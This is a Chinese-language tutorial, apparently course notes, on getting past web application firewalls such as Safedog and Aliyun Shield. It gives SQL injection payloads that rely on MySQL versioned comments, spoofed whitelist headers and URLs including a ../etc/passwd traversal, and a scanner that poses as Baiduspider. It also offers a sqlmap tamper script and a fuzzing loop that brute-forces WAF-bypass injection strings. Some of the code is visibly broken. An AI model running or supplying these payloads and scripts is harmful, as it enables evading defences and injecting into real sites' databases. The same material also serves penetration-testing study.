**前言：**在攻防实战中，往往需要掌握一些特性，比如服务器、数据库、应用层、WAF层等，以便我们更灵活地去构造Payload，从而可以和各种WAF进行对抗，甚至绕过安全防御措施进行漏洞利用。

![](https://img.yatjay.top/md/202203251653331.png)

# 涉及知识

[sqlmap temper脚本使用教程](https://blog.csdn.net/qq_34444097/article/details/82717357)

# 演示案例

## 其他绕过方式学习

### 方式一：IP白名单

通过对网站ip地址的伪造，知道对方网站ip地址，那就默认该IP地址为白名单。

从网络层获取的ip，这种一般伪造不来，如果是获取客户端的ip，这样就饿可能存在伪造ip绕过的情况。

测试方法：修改http的header来bypass waf

X-forwarded-for

X-remote-IP

X-remote-addr

X-Real-IP

### 方式二：静态资源

特定的静态资源后缀请求，常见的静态文件(.txt、.js、.jpg、.swf、.css等），类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求。

原来这样写：http://127.0.0.1/sql.php?id=1 and 1=1

换成这样写：http://127.0.0.1/sql.php/1.js?id=1  and 1=1

上述两种写法的sql.php都能接收到id=1，但是第二种方式提交可以绕过早期的WAF

备注：Aspx/php只识别到前面的.aspx/.php，后面基本不识别。

![img](https://img.yatjay.top/md/202203251653692.png)

不过这是老版本waf不过滤，现在一般也会过滤掉

![img](https://img.yatjay.top/md/202203251653486.png)

### 方式三：url白名单（老版本waf）

为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势：

[http://127.0.0.1/sql.php/admin/php?id=1](http://10.9.9.201/sql.php/admin/php?id=1)

[http://127.0.0.1/sql.php?a=/manage/&b=../etc/passwd](http://10.9.9.201/sql.php?a=/manage/&b=../etc/passwd)

[http://127.0.0.1/../../../manage/../sql.asp?id=2](http://10.9.9.201/../../../manage/../sql.asp?id=2)

waf通过/manage/进行比较，只要url中存在/manage/就作为白名单不进行检测，这样我们可以通过/sql.php?1=manage/&b=../etc/passwd绕过防御规则。

![img](https://img.yatjay.top/md/202203251653857.png)

![img](https://img.yatjay.top/md/202203251653917.png)

依旧拦截是因为老版本waf才可以，新版本的会拦截     

![img](https://img.yatjay.top/md/202203251653746.png)

### 方式四：爬虫白名单(不是注入绕过而是扫描绕过WAF经常用到）

伪装成搜索引擎

部分waf有提供爬虫白名单的功能，识别爬虫的技术一般有两种：

1. 根据识别User-Agent 

2. 通过行为来判断

安全狗开启流量防护

![img](https://img.yatjay.top/md/202203251653755.png)

扫描网站，使用GET请求方式扫描——都是误报，这些文件都不存在，是因为请求过快，WAF识别流量并拦截

![img](https://img.yatjay.top/md/202203251653274.png)

扫描之后再访问页面就会被拦截

![img](https://img.yatjay.top/md/202203251654474.png)

上述实验结果：

1. 直接硬扫，网站直接打不开(封IP)
2. 扫到的网站目录是假的

针对这种现象，可以通过Python脚本，在对网站扫描时伪造成百度的爬虫进行请求

UserAgent可以很容易欺骗，我们可以**伪装成爬虫尝试绕过**。

User Agent Switcher (firefox 附加组件)，下载地址：

https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/

伪造成百度爬虫脚本如下

```python
import json
import requests

url='http://192.168.0.103:8080/' # 目的url

head={
	'User-Agent':'Mozilla/5.0(compatible;Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)'
}
for data in open('PHP.txt'): # 字典，可以从扫描软件配置文件中复制而来
    data=data.replace('\n','')
    urls=url+data 
    code=requests.get(urls,headers=head).status_code  # 请求时添加百度的HTTP头部
    print(urls+'|'+str(code))
```

运行结果

![img](https://img.yatjay.top/md/202203251654487.png)

使用伪装脚本进行爬取，发现网站是没有任何拦截的。返回200的页面是存在的，404的页面不存在  

![](https://img.yatjay.top/md/202203251705303.png)

![](https://img.yatjay.top/md/202203251655549.png)

没有触发拦截，扫描结果正确，其原因就在于，请求的时候HTTP请求头部中添加了百度爬虫的User-Agent

### 方法五：数据库特性绕过补充——MySQL数据库版本编号特性绕过

数据库特性（补充）

```sql
%23x%0aunion%23x%0Aselect%201,2,3  

%20/*!44509union*/%23x%0aselect%201,2,3  //数据库版本编号特性

id=1/**&id=-1%20union%20select%201,2,3%23*/

%20union%20all%23%0a%20select%201,2,3%23  //all干扰union和select连续被匹配

```

分析下句

```sql
%20union%20/*!44509select*/%201,2,3
```

/\*!50001\*/ 注释解释

在MySQL里，多行解释 是 /* \*/，这个是SQL的标准 

但是MySQL扩张了解释 的功能

假如 在起头的/*后头加了惊叹号，那么此解释 里的语句将被执行，比如 

```bash
mysql> /*! select * from test */;
+------+
| id  |
+------+
|  1 |
|  2 |
|  3 |
+------+
3 rows in set (0.00 sec)
```

再看如下语句

```sql
/*!50001 select * from test */;
```

这里的50001表示假如 数据库是5.00.01以上版本，该语句才会被执行

因此固然注入语句在注释里，实际上它是会被执行的

假如是以下内容，就不会执行了，那是真正的注释了

`/* select * from test */;`

## fuzz绕过脚本结合编写测试(后期写脚本再讲)

### fuzz是什么

Fuzz 本意是 “羽毛、细小的毛发、使模糊、变得模糊”，后来用在软件测试领域，中文一般指 “模糊测试”，在渗透测试中指的是一种基于黑盒或灰盒的测试技术，通过自动化生成并执行大量的随机测试用例来发现产品或协议的未知漏洞。

Fuzz 技术首先是一种自动化技术，即软件自动执行相对随机的测试用例。因为是依靠计算机软件自动执行，所以测试效率相对人来讲远远高出几个数量级。比如，一个优秀的测试人员，一天能执行的测试用例数量最多也就是几十个，很难达到 100 个。而 Fuzz 工具可能几分钟就可以轻松执行上百个测试用例。

Fuzz 技术本质是依赖随机函数生成随机测试用例，随机性意味着不重复、不可预测，可能有意想不到的输入和结果。

根据概率论里面的 “大数定律”，只要我们重复的次数够多、随机性够强，那些概率极低的偶然事件就必然会出现。Fuzz 技术就是大数定律的典范应用，足够多的测试用例和随机性，就可以让那些隐藏的很深很难出现的 Bug 成为必然现象。

目前，Fuzz 技术已经是软件测试、漏洞挖掘领域的最有效的手段之一。Fuzz 技术特别适合用于发现 0 Day 漏洞，也是众多黑客或黑帽子发现软件漏洞的首选技术。Fuzz 虽然不能直接达到入侵的效果，但是 Fuzz 非常容易找到软件或系统的漏洞，以此为突破口深入分析，就更容易找到入侵路径，这就是黑客喜欢 Fuzz 技术的原因。

[Fuzz脚本的编写教程](https://www.jianshu.com/p/ba3f8f1815ad?utm_campaign=haruki&utm_content=note&utm_medium=reader_share&utm_source=qq)

### fuzz脚本示例

```python
#!/usr/bin/envpython

"""
Copyright(c)2006-2019sqlmapdevelopers(http://sqlmap.org/)
Seethefile'LICENSE'forcopyingpermission
"""

import os

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__=PRIORITY.HIGHEST

def dependencies():
	singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s"%(os.path.basename(__file__).split(".")[0],DBMS.MYSQL))

def tamper(payload,**kwargs):
    
#%23a%0aunion/*!44575select*/1,2,3
	if payload:
        payload=payload.replace("union","%23a%0aunion")
        payload=payload.replace("select","/*!44575select*/")
        payload=payload.replace("%20","%23a%0a")
        payload=payload.replace("","%23a%0a")
        payload=payload.replace("database()","database%23a%0a()")
	return payload

import requests,time

url='http://127.0.0.1:8080/sqlilabs/Less-2/?id=-1'
union='union'
select='select'
num='1,2,3'
a={'%0a','%23'}
aa={'x'}
aaa={'%0a','%23'}
b='/*!'
c='*/'
def bypass():
	for xiaodi in a:
		for xiaodis in aa:
			for xiaodiss in aaa:
				for two in range(44500,44600):
					urls=url+xiaodi+xiaodis+xiaodiss+b+str(two)+union+c+xiaodi+xiaodis+xiaodiss+select+xiaodi+xiaodis+xiao
diss+num
					#urlss=url+xiaodi+xiaodis+xiaodiss+union+xiaodi+xiaodis+xiaodiss+b+str(two)+select+c+xiaodi+xiaodis+xia
odiss+num
					try:
						result=requests.get(urls).text
						len_r=len(result)
						if (result.find('safedog')==-1):
							#print('bypass url addreess：'+urls+'|'+str(len_r))
							 print('bypass url addreess：'+urls+'|'+str(len_r))
						if len_r==715:
                             fp = open('url.txt','a+')
                             fp.write(urls+'\n')
                             fp.close()
					except Exception as err:
						print('connecting error')
						time.sleep(0.1)
if__name__=='__main__':
	print('fuzz strat!')
	bypass()
```

## 阿里云盾防SQL注入简要分析

使用sqlmap

![img](https://img.yatjay.top/md/202203251654550.png)

使用sqlmap跑过之后阿里云盾会对二次请求进行拦截

开启安全狗，使用sqlmap发现未报出注入点

![img](https://img.yatjay.top/md/202203251654427.png)

这时就需要使用到sqlmap的脚本文件（自带大概率无法达到目的），脚本文件存在temper文件夹中（[一般脚本使用教程](https://blog.csdn.net/qq_34444097/article/details/82717357)）

![img](https://img.yatjay.top/md/202203251654027.png)

接下来要想使用的话还是得自己编写脚本

## 安全狗+云盾SQL注入插件脚本编写

自己编写脚本bypassdog.py(也就是rdog.py)

![img](https://img.yatjay.top/md/202203251654261.png)

直接使用脚本是无法跑来的，抓包到本地分析一下

![img](https://img.yatjay.top/md/202203251654759.png)

### 安全狗防止sqlmap注入攻击——会检测请求数据包的User-Agent

User-Agent显示的是sqlmap的信息

![img](https://img.yatjay.top/md/202203251654011.png)

查看安全狗上面会有拦截记录，分析可知是HTTP请求头User-agent的原因

![img](https://img.yatjay.top/md/202203251654915.png)

并且漏洞防护规则也开启了工具拦截

![img](https://img.yatjay.top/md/202203251654650.png)

根据这些我们知道了拦截原因：通过请求头及指纹库，知道了是使用工具sqlmap对网站进行了恶意扫描，所以进行了拦截

比如User-Agent改为1就没有进行拦截

![img](https://img.yatjay.top/md/202203251654378.png)

当然在使用sqlmap时可以加上参数`--random agent`（随机出现字母头）

![img](https://img.yatjay.top/md/202203251654046.png)

![img](https://img.yatjay.top/md/202203251654601.png)

获取表名

![img](https://img.yatjay.top/md/202203251654014.png)

可以使用burp查看sqlmap的注入语句

![img](https://img.yatjay.top/md/202203251654928.png)

表名出现了

![img](https://img.yatjay.top/md/202203251655878.png)

![img](https://img.yatjay.top/md/202203251655883.png)

### 安全狗开启流量防护——访问速度过快会被拦截

如果安全狗开启流量防护

![img](https://img.yatjay.top/md/202203251655657.png)

sqlmap的速度过快，所以会被拦截

![img](https://img.yatjay.top/md/202203251655657.png)

解决方法：

1. 添加延时参数 --delay参数

![img](https://img.yatjay.top/md/202203251655397.png)

2. 使用代理池随机出IP

3. 更改请求头，添加http白名单 浏览器请求头 --user-Agent=" "

![img](https://img.yatjay.top/md/202203251655563.png)

发现请求正常无拦截

![img](https://img.yatjay.top/md/202203251655862.png)

4. 如果需要更改的数据不是User-Agent
 - 使用burp的intruder模块（很麻烦）

![img](https://img.yatjay.top/md/202203251655755.png)

 - 自己编写

![img](https://img.yatjay.top/md/202203251655790.png)

然后使用`-r 3.txt`使用TXT文本里的数据包请求，即自己指定数据包
![img](https://img.yatjay.top/md/202203251655761.png)



- sqlmap去注入本地的脚本地址 --> 本地搭建脚本(请求数据包自定义编写) --> 远程地址

# 涉及资源

## 伪造成百度爬虫进行扫描脚本

```python
import json
import requests

url='http://192.168.0.103:8080/'

head={
	'User-Agent':'Mozilla/5.0(compatible;Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)'
}
for data in open('PH1P.txt'):
    data=data.replace('\n','')
    urls=url+data
    code=requests.get(urls.headers=head).status_code
    print(urls+'|'+str(code))
```

## fuzz绕过脚本

```python
#!/usr/bin/envpython

"""
Copyright(c)2006-2019sqlmapdevelopers(http://sqlmap.org/)
Seethefile'LICENSE'forcopyingpermission
"""

import os

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__=PRIORITY.HIGHEST

def dependencies():
	singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s"%(os.path.basename(__file__).split(".")[0],DBMS.MYSQL))

def tamper(payload,**kwargs):
    
#%23a%0aunion/*!44575select*/1,2,3
	if payload:
        payload=payload.replace("union","%23a%0aunion")
        payload=payload.replace("select","/*!44575select*/")
        payload=payload.replace("%20","%23a%0a")
        payload=payload.replace("","%23a%0a")
        payload=payload.replace("database()","database%23a%0a()")
	return payload

import requests,time

url='http://127.0.0.1:8080/sqlilabs/Less-2/?id=-1'
union='union'
select='select'
num='1,2,3'
a={'%0a','%23'}
aa={'x'}
aaa={'%0a','%23'}
b='/*!'
c='*/'
def bypass():
	for xiaodi in a:
		for xiaodis in aa:
			for xiaodiss in aaa:
				for two in range(44500,44600):
					urls=url+xiaodi+xiaodis+xiaodiss+b+str(two)+union+c+xiaodi+xiaodis+xiaodiss+select+xiaodi+xiaodis+xiao
diss+num
					#urlss=url+xiaodi+xiaodis+xiaodiss+union+xiaodi+xiaodis+xiaodiss+b+str(two)+select+c+xiaodi+xiaodis+xia
odiss+num
					try:
						result=requests.get(urls).text
						len_r=len(result)
						if (result.find('safedog')==-1):
							#print('bypass url addreess：'+urls+'|'+str(len_r))
							 print('bypass url addreess：'+urls+'|'+str(len_r))
						if len_r==715:
                             fp = open('url.txt','a+')
                             fp.write(urls+'\n')
                             fp.close()
					except Exception as err:
						print('connecting error')
						time.sleep(0.1)
if__name__=='__main__':
	print('fuzz strat!')
	bypass()
    
    
```

